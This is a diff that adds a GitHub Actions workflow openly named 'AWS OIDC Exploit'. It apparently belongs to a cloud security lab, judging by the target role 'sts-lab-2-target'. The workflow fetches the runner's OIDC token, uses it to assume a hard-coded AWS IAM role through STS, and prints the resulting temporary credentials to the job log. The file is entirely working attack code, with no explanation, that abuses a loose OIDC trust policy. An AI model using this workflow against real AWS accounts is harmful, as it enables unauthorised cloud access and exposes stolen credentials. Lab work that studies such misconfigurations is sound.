@@ -1,0 +1,31 @@
+name: AWS OIDC Exploit
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  assume-role:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Assume Role via OIDC
+      run: |
+        echo "Getting OIDC token..."
+        export AWS_ROLE_ARN="arn:aws:iam::481008523238:role/sts-lab-2-target"
+        export AWS_WEB_IDENTITY_TOKEN_FILE=$(mktemp)
+        curl -s $ACTIONS_ID_TOKEN_REQUEST_URL \
+          -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" > $AWS_WEB_IDENTITY_TOKEN_FILE
+
+        export AWS_REGION=us-east-1
+
+        echo "Calling STS to assume the role..."
+        creds=$(aws sts assume-role-with-web-identity \
+          --role-arn "$AWS_ROLE_ARN" \
+          --role-session-name exploitSession \
+          --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE \
+          --duration-seconds 900)
+
+        echo "$creds" | jq .
